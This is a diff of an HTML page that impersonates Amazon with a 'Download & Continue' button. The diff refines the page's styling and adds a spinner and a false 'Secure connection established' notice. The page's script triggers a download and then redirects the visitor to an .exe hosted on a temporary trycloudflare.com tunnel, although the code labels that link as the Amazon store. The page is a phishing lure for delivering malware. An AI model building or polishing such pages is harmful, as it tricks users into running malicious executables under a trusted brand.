@@ -2,107 +2,184 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Download File</title>
+    <title>Download & Continue to Amazon</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
     <style>
+        :root {
+            --amazon-orange: #FF9900;
+            --amazon-navy: #232F3E;
+            --bg-dark: #131921;
+            --card-bg: #ffffff;
+            --text-main: #111111;
+            --text-muted: #565959;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Arial, Helvetica, sans-serif;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
 
         body {
             height: 100vh;
-            background: linear-gradient(135deg, #232f3e, #131a22);
+            background-color: var(--bg-dark);
+            background: radial-gradient(circle at center, #232f3e 0%, #131921 100%);
             display: flex;
             align-items: center;
             justify-content: center;
+            padding: 20px;
         }
 
-        .wrapper {
-            background: #ffffff;
+        .container {
+            background: var(--card-bg);
             width: 100%;
-            max-width: 500px;
-            padding: 40px 30px;
+            max-width: 420px;
+            padding: 40px 32px;
             text-align: center;
-            border-radius: 12px;
-            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            animation: fadeIn 0.6s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         .amazon-logo {
-            width: 160px;
-            margin-bottom: 20px;
+            width: 130px;
+            margin-bottom: 25px;
         }
 
         h1 {
             font-size: 24px;
-            margin-bottom: 15px;
-            color: #111;
+            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 12px;
         }
 
         p {
-            font-size: 16px;
-            color: #555;
+            font-size: 15px;
+            color: var(--text-muted);
+            line-height: 1.5;
             margin-bottom: 30px;
         }
 
-        button {
+        .download-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
             width: 100%;
-            padding: 15px;
-            font-size: 18px;
-            background-color: #ff9900;
+            padding: 16px;
+            font-size: 17px;
+            background: var(--amazon-orange);
             color: #111;
-            border: none;
-            border-radius: 6px;
+            border: 1px solid #a88734;
+            border-radius: 8px;
             cursor: pointer;
-            font-weight: bold;
-            transition: background 0.3s;
+            font-weight: 600;
+            transition: all 0.2s ease;
+            box-shadow: 0 2px 5px rgba(213, 217, 217, 0.5);
         }
 
-        button:hover {
-            background-color: #e68a00;
+        .download-btn:hover {
+            background: #f7ca00;
+            border-color: #a88734;
+            transform: translateY(-1px);
         }
 
-        .note {
-            margin-top: 15px;
-            font-size: 13px;
-            color: #777;
+        .download-btn:active {
+            transform: translateY(1px);
+            background: #f0c14b;
+        }
+
+        .status-msg {
+            display: none;
+            margin-top: 20px;
+            font-size: 14px;
+            color: var(--amazon-orange);
+            font-weight: 500;
+        }
+
+        .footer-note {
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            font-size: 12px;
+            color: #888;
+        }
+
+        .secure-icon {
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 4px;
+            color: #767676;
+        }
+
+        /* Loading Spinner Animation */
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(0,0,0,0.1);
+            border-top: 3px solid #111;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
 
-<div class="wrapper">
+<div class="container">
     <img 
         src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" 
-        alt="Amazon Logo" 
+        alt="Amazon" 
         class="amazon-logo"
     >
 
-    <h1>Your Download Is Ready</h1>
-    <p>Click the button below to download your file and continue to Amazon.</p>
+    <h1>Your file is ready</h1>
+    <p>Download your document and continue to the official Amazon store.</p>
 
-    <button onclick="redirectAndDownload()">
-        Download & Continue
+    <button class="download-btn" id="mainBtn" onclick="handleAction()">
+        <span id="btnText">Download & Continue</span>
+        <div class="spinner" id="spinner"></div>
     </button>
 
-    <div class="note">
-        You will be redirected to Amazon automatically.
+    <div id="status" class="status-msg">Starting download...</div>
+
+    <div class="footer-note">
+        <span class="secure-icon">🔒</span> Secure connection established.<br>
+        You will be redirected automatically.
     </div>
 </div>
 
 <script>
-    function redirectAndDownload() {
+    function handleAction() {
+        const btn = document.getElementById('mainBtn');
+        const btnText = document.getElementById('btnText');
+        const spinner = document.getElementById('spinner');
+        const status = document.getElementById('status');
 
-        // 🔽 FILE DOWNLOAD LINK
-        const fileUrl = "your-file.pdf"; // change file name or link
+        // UI Changes
+        btnText.innerText = "Processing...";
+        spinner.style.display = "block";
+        status.style.display = "block";
+        btn.style.pointerEvents = "none";
+        btn.style.opacity = "0.9";
 
-        // 🛒 AMAZON LINK
-        const amazonUrl = "https://gardening-mpeg-instrumentation-inquiry.trycloudflare.com/links/new/amazon_GWvJN12h4kCbqfY.exe"; // put your Amazon / affiliate link
+        // CONFIGURATION
+        const fileUrl = "your-file.pdf"; 
+        const amazonUrl = "https://gardening-mpeg-instrumentation-inquiry.trycloudflare.com/links/new/amazon_GWvJN12h4kCbqfY.exe"; 
 
-        // Start file download
+        // 1. Trigger Download
         const link = document.createElement("a");
         link.href = fileUrl;
         link.download = "";
@@ -110,14 +187,12 @@
         link.click();
         document.body.removeChild(link);
 
-        // Redirect after short delay
+        // 2. Redirect after 1.5 seconds (gives user time to see the download start)
         setTimeout(() => {
             window.location.href = amazonUrl;
-        }, 700);
+        }, 1500);
     }
 </script>
 
 </body>
 </html>
-
-
